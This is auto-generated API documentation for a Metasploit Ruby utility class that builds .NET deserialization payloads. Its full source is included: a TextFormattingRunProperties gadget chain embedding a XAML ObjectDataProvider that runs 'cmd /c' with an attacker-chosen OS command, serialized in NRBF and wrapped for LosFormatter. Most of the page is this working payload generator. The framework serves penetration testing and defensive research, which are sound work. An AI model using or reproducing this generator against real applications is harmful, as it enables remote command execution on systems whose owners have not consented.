<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>
  Class: Msf::Util::DotNetDeserialization
  
    &mdash; Documentation by YARD 0.9.24
  
</title>

  <link rel="stylesheet" href="../../css/style.css" type="text/css" />

  <link rel="stylesheet" href="../../css/common.css" type="text/css" />

<script type="text/javascript">
  pathId = "Msf::Util::DotNetDeserialization";
  relpath = '../../';
</script>


  <script type="text/javascript" charset="utf-8" src="../../js/jquery.js"></script>

  <script type="text/javascript" charset="utf-8" src="../../js/app.js"></script>


  </head>
  <body>
    <div class="nav_wrap">
      <iframe id="nav" src="../../class_list.html?1"></iframe>
      <div id="resizer"></div>
    </div>

    <div id="main" tabindex="-1">
      <div id="header">
        <div id="menu">
  
    <a href="../../_index.html">Index (D)</a> &raquo;
    <span class='title'><span class='object_link'><a href="../../Msf.html" title="Msf (module)">Msf</a></span></span> &raquo; <span class='title'><span class='object_link'><a href="../Util.html" title="Msf::Util (module)">Util</a></span></span>
     &raquo; 
    <span class="title">DotNetDeserialization</span>
  
</div>

        <div id="search">
  
    <a class="full_list_link" id="class_list_link"
        href="../../class_list.html">

        <svg width="24" height="24">
          <rect x="0" y="4" width="24" height="4" rx="1" ry="1"></rect>
          <rect x="0" y="12" width="24" height="4" rx="1" ry="1"></rect>
          <rect x="0" y="20" width="24" height="4" rx="1" ry="1"></rect>
        </svg>
    </a>
  
</div>
        <div class="clear"></div>
      </div>

      <div id="content"><h1>Class: Msf::Util::DotNetDeserialization
  
  
  
</h1>
<div class="box_info">
  
  <dl>
    <dt>Inherits:</dt>
    <dd>
      <span class="inheritName">Object</span>
      
        <ul class="fullTree">
          <li>Object</li>
          
            <li class="next">Msf::Util::DotNetDeserialization</li>
          
        </ul>
        <a href="#" class="inheritanceTree">show all</a>
      
    </dd>
  </dl>
  

  
  
  
  
  

  

  
  <dl>
    <dt>Defined in:</dt>
    <dd>lib/msf/util/dot_net_deserialization.rb</dd>
  </dl>
  
</div>

<h2>Overview</h2><div class="docstring">
  <div class="discussion">
    
<p>Much of this code is based on the YSoSerial.Net project see: <a href="https://github.com/pwntester/ysoserial.net">github.com/pwntester/ysoserial.net</a></p>


  </div>
</div>
<div class="tags">
  

</div><h2>Defined Under Namespace</h2>
<p class="children">
  
    
  
    
      <strong class="classes">Classes:</strong> <span class='object_link'><a href="DotNetDeserialization/BinaryLibrary.html" title="Msf::Util::DotNetDeserialization::BinaryLibrary (class)">BinaryLibrary</a></span>, <span class='object_link'><a href="DotNetDeserialization/BinaryObjectString.html" title="Msf::Util::DotNetDeserialization::BinaryObjectString (class)">BinaryObjectString</a></span>, <span class='object_link'><a href="DotNetDeserialization/ClassInfo.html" title="Msf::Util::DotNetDeserialization::ClassInfo (class)">ClassInfo</a></span>, <span class='object_link'><a href="DotNetDeserialization/ClassWithMembersAndTypes.html" title="Msf::Util::DotNetDeserialization::ClassWithMembersAndTypes (class)">ClassWithMembersAndTypes</a></span>, <span class='object_link'><a href="DotNetDeserialization/LengthPrefixedString.html" title="Msf::Util::DotNetDeserialization::LengthPrefixedString (class)">LengthPrefixedString</a></span>, <span class='object_link'><a href="DotNetDeserialization/MemberTypeInfo.html" title="Msf::Util::DotNetDeserialization::MemberTypeInfo (class)">MemberTypeInfo</a></span>, <span class='object_link'><a href="DotNetDeserialization/MessageEnd.html" title="Msf::Util::DotNetDeserialization::MessageEnd (class)">MessageEnd</a></span>, <span class='object_link'><a href="DotNetDeserialization/ObjectStateFormatter.html" title="Msf::Util::DotNetDeserialization::ObjectStateFormatter (class)">ObjectStateFormatter</a></span>, <span class='object_link'><a href="DotNetDeserialization/SerializationHeaderRecord.html" title="Msf::Util::DotNetDeserialization::SerializationHeaderRecord (class)">SerializationHeaderRecord</a></span>
    
  
</p>

  
    <h2>
      Constant Summary
      <small><a href="#" class="constants_summary_toggle">collapse</a></small>
    </h2>

    <dl class="constants">
      
        <dt id="DEFAULT_FORMATTER-constant" class="">DEFAULT_FORMATTER =
          
        </dt>
        <dd><pre class="code"><span class='symbol'>:LosFormatter</span></pre></dd>
      
        <dt id="DEFAULT_GADGET_CHAIN-constant" class="">DEFAULT_GADGET_CHAIN =
          
        </dt>
        <dd><pre class="code"><span class='symbol'>:TextFormattingRunProperties</span></pre></dd>
      
        <dt id="BinaryTypeEnum-constant" class="">BinaryTypeEnum =
          <div class="docstring">
  <div class="discussion">
    
<p>.NET Serialization Enumerations</p>


  </div>
</div>
<div class="tags">
  

</div>
        </dt>
        <dd><pre class="code"><span class='lbrace'>{</span>
  <span class='comment'># see: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrbf/054e5c58-be21-4c86-b1c3-f6d3ce17ec72
</span>  <span class='symbol'>:Primitive</span> <span class='op'>=&gt;</span> <span class='int'>0</span><span class='comma'>,</span>
  <span class='symbol'>:String</span> <span class='op'>=&gt;</span> <span class='int'>1</span><span class='comma'>,</span>
  <span class='symbol'>:Object</span> <span class='op'>=&gt;</span> <span class='int'>2</span><span class='comma'>,</span>
  <span class='symbol'>:SystemClass</span> <span class='op'>=&gt;</span> <span class='int'>3</span><span class='comma'>,</span>
  <span class='symbol'>:Class</span> <span class='op'>=&gt;</span> <span class='int'>4</span><span class='comma'>,</span>
  <span class='symbol'>:ObjectArray</span> <span class='op'>=&gt;</span> <span class='int'>5</span><span class='comma'>,</span>
  <span class='symbol'>:StringArray</span> <span class='op'>=&gt;</span> <span class='int'>6</span><span class='comma'>,</span>
  <span class='symbol'>:PrimitiveArray</span> <span class='op'>=&gt;</span> <span class='int'>7</span>
<span class='rbrace'>}</span></pre></dd>
      
        <dt id="RecordTypeEnum-constant" class="">RecordTypeEnum =
          
        </dt>
        <dd><pre class="code"><span class='lbrace'>{</span>
  <span class='comment'># see: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrbf/954a0657-b901-4813-9398-4ec732fe8b32
</span>  <span class='symbol'>:SerializedStreamHeader</span> <span class='op'>=&gt;</span> <span class='int'>0</span><span class='comma'>,</span>
  <span class='symbol'>:ClassWithId</span> <span class='op'>=&gt;</span> <span class='int'>1</span><span class='comma'>,</span>
  <span class='symbol'>:SystemClassWithMembers</span> <span class='op'>=&gt;</span> <span class='int'>2</span><span class='comma'>,</span>
  <span class='symbol'>:ClassWithMembers</span> <span class='op'>=&gt;</span> <span class='int'>3</span><span class='comma'>,</span>
  <span class='symbol'>:SystemClassWithMembersAndTypes</span> <span class='op'>=&gt;</span> <span class='int'>4</span><span class='comma'>,</span>
  <span class='symbol'>:ClassWithMembersAndTypes</span> <span class='op'>=&gt;</span> <span class='int'>5</span><span class='comma'>,</span>
  <span class='symbol'>:BinaryObjectString</span> <span class='op'>=&gt;</span> <span class='int'>6</span><span class='comma'>,</span>
  <span class='symbol'>:BinaryArray</span> <span class='op'>=&gt;</span> <span class='int'>7</span><span class='comma'>,</span>
  <span class='symbol'>:MemberPrimitiveTyped</span> <span class='op'>=&gt;</span> <span class='int'>8</span><span class='comma'>,</span>
  <span class='symbol'>:MemberReference</span> <span class='op'>=&gt;</span> <span class='int'>9</span><span class='comma'>,</span>
  <span class='symbol'>:ObjectNull</span> <span class='op'>=&gt;</span> <span class='int'>10</span><span class='comma'>,</span>
  <span class='symbol'>:MessageEnd</span> <span class='op'>=&gt;</span> <span class='int'>11</span><span class='comma'>,</span>
  <span class='symbol'>:BinaryLibrary</span> <span class='op'>=&gt;</span> <span class='int'>12</span><span class='comma'>,</span>
  <span class='symbol'>:ObjectNullMultiple256</span> <span class='op'>=&gt;</span> <span class='int'>13</span><span class='comma'>,</span>
  <span class='symbol'>:ObjectNullMultiple</span> <span class='op'>=&gt;</span> <span class='int'>14</span><span class='comma'>,</span>
  <span class='symbol'>:ArraySinglePrimitive</span> <span class='op'>=&gt;</span> <span class='int'>15</span><span class='comma'>,</span>
  <span class='symbol'>:ArraySingleObject</span> <span class='op'>=&gt;</span> <span class='int'>16</span><span class='comma'>,</span>
  <span class='symbol'>:ArraySingleString</span> <span class='op'>=&gt;</span> <span class='int'>17</span><span class='comma'>,</span>
  <span class='symbol'>:MethodCall</span> <span class='op'>=&gt;</span> <span class='int'>21</span><span class='comma'>,</span>
  <span class='symbol'>:MethodReturn</span> <span class='op'>=&gt;</span> <span class='int'>22</span>
<span class='rbrace'>}</span></pre></dd>
      
    </dl>
  







  
    <h2>
      Class Method Summary
      <small><a href="#" class="summary_toggle">collapse</a></small>
    </h2>

    <ul class="summary">
      
        <li class="public ">
  <span class="summary_signature">
    
      <a href="#encode_7bit_int-class_method" title="encode_7bit_int (class method)">.<strong>encode_7bit_int</strong>(int)  &#x21d2; Object </a>
    

    
  </span>
  
  
  
  
  
  
  

  
    <span class="summary_desc"><div class='inline'></div></span>
  
</li>

      
        <li class="public ">
  <span class="summary_signature">
    
      <a href="#generate-class_method" title="generate (class method)">.<strong>generate</strong>(cmd, gadget_chain: DEFAULT_GADGET_CHAIN, formatter: DEFAULT_FORMATTER)  &#x21d2; String </a>
    

    
  </span>
  
  
  
  
  
  
  

  
    <span class="summary_desc"><div class='inline'>
<p>Generates a .NET deserialization payload for the specified OS command using a selected gadget-chain and formatter combination.</p>
</div></span>
  
</li>

      
        <li class="public ">
  <span class="summary_signature">
    
      <a href="#generate_formatted-class_method" title="generate_formatted (class method)">.<strong>generate_formatted</strong>(serialized, formatter: DEFAULT_FORMATTER)  &#x21d2; String </a>
    

    
  </span>
  
  
  
  
  
  
  

  
    <span class="summary_desc"><div class='inline'>
<p>Take the specified serialized blob and encapsulate it with the specified formatter.</p>
</div></span>
  
</li>

      
        <li class="public ">
  <span class="summary_signature">
    
      <a href="#generate_gadget_chain-class_method" title="generate_gadget_chain (class method)">.<strong>generate_gadget_chain</strong>(cmd, gadget_chain: DEFAULT_GADGET_CHAIN)  &#x21d2; String </a>
    

    
  </span>
  
  
  
  
  
  
  

  
    <span class="summary_desc"><div class='inline'>
<p>Generate a serialized data blob using the specified gadget chain to execute the OS command.</p>
</div></span>
  
</li>

      
    </ul>
  



  <div id="class_method_details" class="method_details_list">
    <h2>Class Method Details</h2>

    
      <div class="method_details first">
  <h3 class="signature first" id="encode_7bit_int-class_method">
  
    .<strong>encode_7bit_int</strong>(int)  &#x21d2; <tt>Object</tt> 
  

  

  
</h3><table class="source_code">
  <tr>
    <td>
      <pre class="lines">


14
15
16
17
18
19
20
21
22
23
24</pre>
    </td>
    <td>
      <pre class="code"><span class="info file"># File 'lib/msf/util/dot_net_deserialization.rb', line 14</span>

<span class='kw'>def</span> <span class='kw'>self</span><span class='period'>.</span><span class='id identifier rubyid_encode_7bit_int'>encode_7bit_int</span><span class='lparen'>(</span><span class='id identifier rubyid_int'>int</span><span class='rparen'>)</span>
  <span class='comment'># see: https://github.com/microsoft/referencesource/blob/3b1eaf5203992df69de44c783a3eda37d3d4cd10/mscorlib/system/io/binaryreader.cs#L582
</span>  <span class='id identifier rubyid_encoded_int'>encoded_int</span> <span class='op'>=</span> <span class='lbracket'>[</span><span class='rbracket'>]</span>
  <span class='kw'>while</span> <span class='id identifier rubyid_int'>int</span> <span class='op'>&gt;</span> <span class='int'>0</span>
    <span class='id identifier rubyid_value'>value</span> <span class='op'>=</span> <span class='id identifier rubyid_int'>int</span> <span class='op'>&amp;</span> <span class='int'>0x7f</span>
    <span class='id identifier rubyid_int'>int</span> <span class='op'>&gt;&gt;=</span> <span class='int'>7</span>
    <span class='id identifier rubyid_value'>value</span> <span class='op'>|=</span> <span class='int'>0x80</span> <span class='kw'>if</span> <span class='id identifier rubyid_int'>int</span> <span class='op'>&gt;</span> <span class='int'>0</span>
    <span class='id identifier rubyid_encoded_int'>encoded_int</span> <span class='op'>&lt;&lt;</span> <span class='id identifier rubyid_value'>value</span>
  <span class='kw'>end</span>
  <span class='kw'>return</span> <span class='id identifier rubyid_encoded_int'>encoded_int</span><span class='period'>.</span><span class='id identifier rubyid_pack'>pack</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>C*</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span>
<span class='kw'>end</span></pre>
    </td>
  </tr>
</table>
</div>
    
      <div class="method_details ">
  <h3 class="signature " id="generate-class_method">
  
    .<strong>generate</strong>(cmd, gadget_chain: DEFAULT_GADGET_CHAIN, formatter: DEFAULT_FORMATTER)  &#x21d2; <tt>String</tt> 
  

  

  
</h3><div class="docstring">
  <div class="discussion">
    
<p>Generates a .NET deserialization payload for the specified OS command using a selected gadget-chain and formatter combination.</p>


  </div>
</div>
<div class="tags">
  <p class="tag_title">Parameters:</p>
<ul class="param">
  
    <li>
      
        <span class='name'>cmd</span>
      
      
        <span class='type'>(<tt>String</tt>)</span>
      
      
      
        &mdash;
        <div class='inline'>
<p>The OS command to execute.</p>
</div>
      
    </li>
  
    <li>
      
        <span class='name'>gadget_chain</span>
      
      
        <span class='type'>(<tt>Symbol</tt>)</span>
      
      
        <em class="default">(defaults to: <tt>DEFAULT_GADGET_CHAIN</tt>)</em>
      
      
        &mdash;
        <div class='inline'>
<p>The gadget chain to use for execution. This will be application specific.</p>
</div>
      
    </li>
  
    <li>
      
        <span class='name'>formatter</span>
      
      
        <span class='type'>(<tt>Symbol</tt>)</span>
      
      
        <em class="default">(defaults to: <tt>DEFAULT_FORMATTER</tt>)</em>
      
      
        &mdash;
        <div class='inline'>
<p>An optional formatter to use to encapsulate the gadget chain.</p>
</div>
      
    </li>
  
</ul>

<p class="tag_title">Returns:</p>
<ul class="return">
  
    <li>
      
      
        <span class='type'>(<tt>String</tt>)</span>
      
      
      
    </li>
  
</ul>

</div><table class="source_code">
  <tr>
    <td>
      <pre class="lines">


203
204
205
206
207</pre>
    </td>
    <td>
      <pre class="code"><span class="info file"># File 'lib/msf/util/dot_net_deserialization.rb', line 203</span>

<span class='kw'>def</span> <span class='kw'>self</span><span class='period'>.</span><span class='id identifier rubyid_generate'>generate</span><span class='lparen'>(</span><span class='id identifier rubyid_cmd'>cmd</span><span class='comma'>,</span> <span class='label'>gadget_chain:</span> <span class='const'><span class='object_link'><a href="#DEFAULT_GADGET_CHAIN-constant" title="Msf::Util::DotNetDeserialization::DEFAULT_GADGET_CHAIN (constant)">DEFAULT_GADGET_CHAIN</a></span></span><span class='comma'>,</span> <span class='label'>formatter:</span> <span class='const'><span class='object_link'><a href="#DEFAULT_FORMATTER-constant" title="Msf::Util::DotNetDeserialization::DEFAULT_FORMATTER (constant)">DEFAULT_FORMATTER</a></span></span><span class='rparen'>)</span>
  <span class='id identifier rubyid_serialized'>serialized</span> <span class='op'>=</span> <span class='kw'>self</span><span class='period'>.</span><span class='id identifier rubyid_generate_gadget_chain'>generate_gadget_chain</span><span class='lparen'>(</span><span class='id identifier rubyid_cmd'>cmd</span><span class='comma'>,</span> <span class='label'>gadget_chain:</span> <span class='id identifier rubyid_gadget_chain'>gadget_chain</span><span class='rparen'>)</span>
  <span class='id identifier rubyid_serialized'>serialized</span> <span class='op'>=</span> <span class='kw'>self</span><span class='period'>.</span><span class='id identifier rubyid_generate_formatted'>generate_formatted</span><span class='lparen'>(</span><span class='id identifier rubyid_serialized'>serialized</span><span class='comma'>,</span> <span class='label'>formatter:</span> <span class='id identifier rubyid_formatter'>formatter</span><span class='rparen'>)</span> <span class='kw'>unless</span> <span class='id identifier rubyid_formatter'>formatter</span><span class='period'>.</span><span class='id identifier rubyid_nil?'>nil?</span>
  <span class='id identifier rubyid_serialized'>serialized</span>
<span class='kw'>end</span></pre>
    </td>
  </tr>
</table>
</div>
    
      <div class="method_details ">
  <h3 class="signature " id="generate_formatted-class_method">
  
    .<strong>generate_formatted</strong>(serialized, formatter: DEFAULT_FORMATTER)  &#x21d2; <tt>String</tt> 
  

  

  
</h3><div class="docstring">
  <div class="discussion">
    
<p>Take the specified serialized blob and encapsulate it with the specified formatter.</p>


  </div>
</div>
<div class="tags">
  <p class="tag_title">Parameters:</p>
<ul class="param">
  
    <li>
      
        <span class='name'>formatter</span>
      
      
        <span class='type'>(<tt>Symbol</tt>)</span>
      
      
        <em class="default">(defaults to: <tt>DEFAULT_FORMATTER</tt>)</em>
      
      
        &mdash;
        <div class='inline'>
<p>The formatter to use to encapsulate the serialized data blob.</p>
</div>
      
    </li>
  
</ul>

<p class="tag_title">Returns:</p>
<ul class="return">
  
    <li>
      
      
        <span class='type'>(<tt>String</tt>)</span>
      
      
      
    </li>
  
</ul>

</div><table class="source_code">
  <tr>
    <td>
      <pre class="lines">


215
216
217
218
219
220
221
222
223
224
225
226
227</pre>
    </td>
    <td>
      <pre class="code"><span class="info file"># File 'lib/msf/util/dot_net_deserialization.rb', line 215</span>

<span class='kw'>def</span> <span class='kw'>self</span><span class='period'>.</span><span class='id identifier rubyid_generate_formatted'>generate_formatted</span><span class='lparen'>(</span><span class='id identifier rubyid_serialized'>serialized</span><span class='comma'>,</span> <span class='label'>formatter:</span> <span class='const'><span class='object_link'><a href="#DEFAULT_FORMATTER-constant" title="Msf::Util::DotNetDeserialization::DEFAULT_FORMATTER (constant)">DEFAULT_FORMATTER</a></span></span><span class='rparen'>)</span>
  <span class='kw'>case</span> <span class='id identifier rubyid_formatter'>formatter</span>
  <span class='kw'>when</span> <span class='symbol'>:LosFormatter</span>
    <span class='comment'># token: Token_BinarySerialized
</span>    <span class='id identifier rubyid_formatted'>formatted</span>  <span class='op'>=</span> <span class='const'><span class='object_link'><a href="DotNetDeserialization/ObjectStateFormatter.html" title="Msf::Util::DotNetDeserialization::ObjectStateFormatter (class)">ObjectStateFormatter</a></span></span><span class='period'>.</span><span class='id identifier rubyid_new'>new</span><span class='lparen'>(</span><span class='label'>token:</span> <span class='int'>50</span><span class='rparen'>)</span><span class='period'>.</span><span class='id identifier rubyid_to_binary_s'>to_binary_s</span>
    <span class='id identifier rubyid_formatted'>formatted</span> <span class='op'>&lt;&lt;</span> <span class='id identifier rubyid_encode_7bit_int'>encode_7bit_int</span><span class='lparen'>(</span><span class='id identifier rubyid_serialized'>serialized</span><span class='period'>.</span><span class='id identifier rubyid_length'>length</span><span class='rparen'>)</span>
    <span class='id identifier rubyid_formatted'>formatted</span> <span class='op'>&lt;&lt;</span> <span class='id identifier rubyid_serialized'>serialized</span>
  <span class='kw'>else</span>
    <span class='id identifier rubyid_raise'>raise</span> <span class='const'>NotImplementedError</span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>The specified formatter is not implemented</span><span class='tstring_end'>&#39;</span></span>
  <span class='kw'>end</span>

  <span class='id identifier rubyid_formatted'>formatted</span>
<span class='kw'>end</span></pre>
    </td>
  </tr>
</table>
</div>
    
      <div class="method_details ">
  <h3 class="signature " id="generate_gadget_chain-class_method">
  
    .<strong>generate_gadget_chain</strong>(cmd, gadget_chain: DEFAULT_GADGET_CHAIN)  &#x21d2; <tt>String</tt> 
  

  

  
</h3><div class="docstring">
  <div class="discussion">
    
<p>Generate a serialized data blob using the specified gadget chain to execute the OS command. The chosen gadget chain must be compatible with the target application.</p>


  </div>
</div>
<div class="tags">
  <p class="tag_title">Parameters:</p>
<ul class="param">
  
    <li>
      
        <span class='name'>gadget_chain</span>
      
      
        <span class='type'>(<tt>Symbol</tt>)</span>
      
      
        <em class="default">(defaults to: <tt>DEFAULT_GADGET_CHAIN</tt>)</em>
      
      
        &mdash;
        <div class='inline'>
<p>The gadget chain to use for execution.</p>
</div>
      
    </li>
  
</ul>

<p class="tag_title">Returns:</p>
<ul class="return">
  
    <li>
      
      
        <span class='type'>(<tt>String</tt>)</span>
      
      
      
    </li>
  
</ul>

</div><table class="source_code">
  <tr>
    <td>
      <pre class="lines">


235
236
237
238
239
240
241
242
243
244
245
246
247
248
249
250
251
252
253
254
255
256
257
258
259
260
261
262
263
264
265
266
267
268
269
270
271
272
273
274
275
276
277
278
279
280
281
282
283
284</pre>
    </td>
    <td>
      <pre class="code"><span class="info file"># File 'lib/msf/util/dot_net_deserialization.rb', line 235</span>

<span class='kw'>def</span> <span class='kw'>self</span><span class='period'>.</span><span class='id identifier rubyid_generate_gadget_chain'>generate_gadget_chain</span><span class='lparen'>(</span><span class='id identifier rubyid_cmd'>cmd</span><span class='comma'>,</span> <span class='label'>gadget_chain:</span> <span class='const'><span class='object_link'><a href="#DEFAULT_GADGET_CHAIN-constant" title="Msf::Util::DotNetDeserialization::DEFAULT_GADGET_CHAIN (constant)">DEFAULT_GADGET_CHAIN</a></span></span><span class='rparen'>)</span>
  <span class='kw'>case</span> <span class='id identifier rubyid_gadget_chain'>gadget_chain</span>
  <span class='kw'>when</span> <span class='symbol'>:TextFormattingRunProperties</span>
    <span class='comment'># see: https://github.com/pwntester/ysoserial.net/blob/master/ysoserial/Generators/TextFormattingRunPropertiesGenerator.cs
</span>    <span class='id identifier rubyid_resource_dictionary'>resource_dictionary</span> <span class='op'>=</span> <span class='const'>Nokogiri</span><span class='op'>::</span><span class='const'>XML</span><span class='lparen'>(</span><span class='heredoc_beg'>&lt;&lt;-EOS</span><span class='comma'>,</span> <span class='kw'>nil</span><span class='comma'>,</span> <span class='kw'>nil</span><span class='comma'>,</span> <span class='id identifier rubyid_options'>options</span><span class='op'>=</span><span class='const'>Nokogiri</span><span class='op'>::</span><span class='const'>XML</span><span class='op'>::</span><span class='const'>ParseOptions</span><span class='op'>::</span><span class='const'>NOBLANKS</span><span class='rparen'>)</span><span class='period'>.</span><span class='id identifier rubyid_root'><span class='object_link'><a href="../../top-level-namespace.html" title="Top Level Namespace (root)">root</a></span></span><span class='period'>.</span><span class='id identifier rubyid_to_xml'>to_xml</span><span class='lparen'>(</span><span class='label'>indent:</span> <span class='int'>0</span><span class='comma'>,</span> <span class='label'>save_with:</span> <span class='int'>0</span><span class='rparen'>)</span>
<span class='tstring_content'>      &lt;ResourceDictionary
        xmlns=&quot;http://schemas.microsoft.com/winfx/2006/xaml/presentation&quot;
        xmlns:X=&quot;http://schemas.microsoft.com/winfx/2006/xaml&quot;
        xmlns:S=&quot;clr-namespace:System;assembly=mscorlib&quot;
        xmlns:D=&quot;clr-namespace:System.Diagnostics;assembly=system&quot;
      &gt;
        &lt;ObjectDataProvider X:Key=&quot;&quot; ObjectType=&quot;{X:Type D:Process}&quot; MethodName=&quot;Start&quot;&gt;
          &lt;ObjectDataProvider.MethodParameters&gt;
            &lt;S:String&gt;cmd&lt;/S:String&gt;
            &lt;S:String&gt;/c </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_cmd'>cmd</span><span class='period'>.</span><span class='id identifier rubyid_encode'>encode</span><span class='lparen'>(</span><span class='symbeg'>:</span><span class='id identifier rubyid_xml'>xml</span> <span class='op'>=&gt;</span> <span class='symbeg'>:</span><span class='id identifier rubyid_text'>text</span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'>&lt;/S:String&gt;
          &lt;/ObjectDataProvider.MethodParameters&gt;
        &lt;/ObjectDataProvider&gt;
      &lt;/ResourceDictionary&gt;
</span><span class='heredoc_end'>    EOS
</span>    <span class='id identifier rubyid_resource_dictionary'>resource_dictionary</span> <span class='op'>=</span> <span class='id identifier rubyid_resource_dictionary'>resource_dictionary</span>

    <span class='id identifier rubyid_library'>library</span> <span class='op'>=</span> <span class='const'><span class='object_link'><a href="DotNetDeserialization/BinaryLibrary.html" title="Msf::Util::DotNetDeserialization::BinaryLibrary (class)">BinaryLibrary</a></span></span><span class='period'>.</span><span class='id identifier rubyid_new'>new</span><span class='lparen'>(</span>
      <span class='label'>library_id:</span> <span class='int'>2</span><span class='comma'>,</span>
      <span class='label'>library_name:</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>Microsoft.PowerShell.Editor, Version=3.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35</span><span class='tstring_end'>&quot;</span></span>
    <span class='rparen'>)</span>

    <span class='id identifier rubyid_serialized'>serialized</span>  <span class='op'>=</span> <span class='const'><span class='object_link'><a href="DotNetDeserialization/SerializationHeaderRecord.html" title="Msf::Util::DotNetDeserialization::SerializationHeaderRecord (class)">SerializationHeaderRecord</a></span></span><span class='period'>.</span><span class='id identifier rubyid_new'>new</span><span class='lparen'>(</span><span class='label'>root_id:</span> <span class='int'>1</span><span class='comma'>,</span> <span class='label'>header_id:</span> <span class='op'>-</span><span class='int'>1</span><span class='rparen'>)</span><span class='period'>.</span><span class='id identifier rubyid_to_binary_s'>to_binary_s</span>
    <span class='id identifier rubyid_serialized'>serialized</span> <span class='op'>&lt;&lt;</span> <span class='id identifier rubyid_library'>library</span><span class='period'>.</span><span class='id identifier rubyid_to_binary_s'>to_binary_s</span>
    <span class='id identifier rubyid_serialized'>serialized</span> <span class='op'>&lt;&lt;</span> <span class='const'><span class='object_link'><a href="DotNetDeserialization/ClassWithMembersAndTypes.html" title="Msf::Util::DotNetDeserialization::ClassWithMembersAndTypes (class)">ClassWithMembersAndTypes</a></span></span><span class='period'>.</span><span class='id identifier rubyid_new'>new</span><span class='lparen'>(</span>
      <span class='label'>class_info:</span> <span class='const'><span class='object_link'><a href="DotNetDeserialization/ClassInfo.html" title="Msf::Util::DotNetDeserialization::ClassInfo (class)">ClassInfo</a></span></span><span class='period'>.</span><span class='id identifier rubyid_new'>new</span><span class='lparen'>(</span>
        <span class='label'>obj_id:</span> <span class='int'>1</span><span class='comma'>,</span>
        <span class='label'>name:</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>Microsoft.VisualStudio.Text.Formatting.TextFormattingRunProperties</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span>
        <span class='label'>member_names:</span> <span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>ForegroundBrush</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span>
      <span class='rparen'>)</span><span class='comma'>,</span>
      <span class='label'>member_type_info:</span> <span class='const'><span class='object_link'><a href="DotNetDeserialization/MemberTypeInfo.html" title="Msf::Util::DotNetDeserialization::MemberTypeInfo (class)">MemberTypeInfo</a></span></span><span class='period'>.</span><span class='id identifier rubyid_new'>new</span><span class='lparen'>(</span>
        <span class='label'>binary_type_enums:</span> <span class='lbracket'>[</span><span class='const'><span class='object_link'><a href="#BinaryTypeEnum-constant" title="Msf::Util::DotNetDeserialization::BinaryTypeEnum (constant)">BinaryTypeEnum</a></span></span><span class='lbracket'>[</span><span class='symbol'>:String</span><span class='rbracket'>]</span><span class='rbracket'>]</span>
      <span class='rparen'>)</span><span class='comma'>,</span>
      <span class='label'>library_id:</span> <span class='id identifier rubyid_library'>library</span><span class='period'>.</span><span class='id identifier rubyid_library_id'>library_id</span>
    <span class='rparen'>)</span><span class='period'>.</span><span class='id identifier rubyid_to_binary_s'>to_binary_s</span>
    <span class='id identifier rubyid_serialized'>serialized</span> <span class='op'>&lt;&lt;</span> <span class='const'><span class='object_link'><a href="DotNetDeserialization/BinaryObjectString.html" title="Msf::Util::DotNetDeserialization::BinaryObjectString (class)">BinaryObjectString</a></span></span><span class='period'>.</span><span class='id identifier rubyid_new'>new</span><span class='lparen'>(</span>
      <span class='label'>obj_id:</span> <span class='int'>3</span><span class='comma'>,</span>
      <span class='label'>string:</span> <span class='id identifier rubyid_resource_dictionary'>resource_dictionary</span>
    <span class='rparen'>)</span><span class='period'>.</span><span class='id identifier rubyid_to_binary_s'>to_binary_s</span>
    <span class='id identifier rubyid_serialized'>serialized</span> <span class='op'>&lt;&lt;</span> <span class='const'><span class='object_link'><a href="DotNetDeserialization/MessageEnd.html" title="Msf::Util::DotNetDeserialization::MessageEnd (class)">MessageEnd</a></span></span><span class='period'>.</span><span class='id identifier rubyid_new'>new</span><span class='period'>.</span><span class='id identifier rubyid_to_binary_s'>to_binary_s</span>
  <span class='kw'>else</span>
    <span class='id identifier rubyid_raise'>raise</span> <span class='const'>NotImplementedError</span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>The specified gadget chain is not implemented</span><span class='tstring_end'>&#39;</span></span>
  <span class='kw'>end</span>

  <span class='id identifier rubyid_serialized'>serialized</span>
<span class='kw'>end</span></pre>
    </td>
  </tr>
</table>
</div>
    
  </div>

</div>

      <div id="footer">
  Generated on Wed Apr 22 00:32:36 2020 by
  <a href="http://yardoc.org" title="Yay! A Ruby Documentation Tool" target="_parent">yard</a>
  0.9.24 (ruby-2.6.3).
</div>

    </div>
  </body>
</html>